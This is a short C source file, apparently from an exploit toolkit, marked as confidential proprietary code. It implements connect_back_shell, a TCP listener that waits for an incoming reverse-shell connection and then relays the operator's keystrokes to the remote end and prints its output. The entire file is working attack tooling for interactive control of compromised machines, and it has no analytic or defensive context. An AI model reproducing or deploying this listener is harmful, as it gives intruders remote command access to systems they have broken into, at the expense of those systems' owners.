/*  
  -- CONFIDENTIAL - SOURCE MATERIALS --
                                                                                                                                                                                                        
  THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE.
  
  -- CONFIDENTIAL - SOURCE MATERIALS --

 */

#include "shell.h"


void 
connect_back_shell(int port)
{
	int s, sd, i, r;
  	struct sockaddr_in serv_addr;
  	fd_set fds;
  	struct timeval tv;
  	char buf[4096];
  	int client_len;
  	struct sockaddr_in client;

  	if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    	printf("[!] error opening socket\n");
    	exit(-1);
 	 }

  	bzero((char *)&serv_addr, sizeof(serv_addr));
  	serv_addr.sin_family = AF_INET;
  	serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
  	serv_addr.sin_port = htons(port);

  	if (bind(s, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
    	printf("[!] error binding\n");
    	exit(-1);
  	}

	if (listen(s, 5) == -1) {
	    printf("[!] error listening\n");
	    exit(-1);
	}

	client_len = sizeof(client);

    if ((sd = accept(s, (struct sockaddr *) &client, 
                        &client_len)) < 0) {
      printf("accept connection failure");
      exit(-1);
    }
 
  	while (1) {
   		FD_ZERO (&fds);
   		FD_SET  (0, &fds);
    	FD_SET  (sd, &fds);

    	tv.tv_sec  = 1;
      	tv.tv_usec = 0;

      	i = select (sd+1, &fds, NULL, NULL, &tv);

		if (FD_ISSET (0, &fds)) {
      	 	memset (buf, '\0', sizeof(buf));
         	i = read(0, buf, sizeof(buf)-1);
         	r = write (sd, buf, i);
      	}

      	if (FD_ISSET (sd, &fds)) {
        	memset (buf, '\0', sizeof(buf));
         	i = read(sd, buf, sizeof(buf)-1);
        	printf ("%s", buf);
      	}
    }

}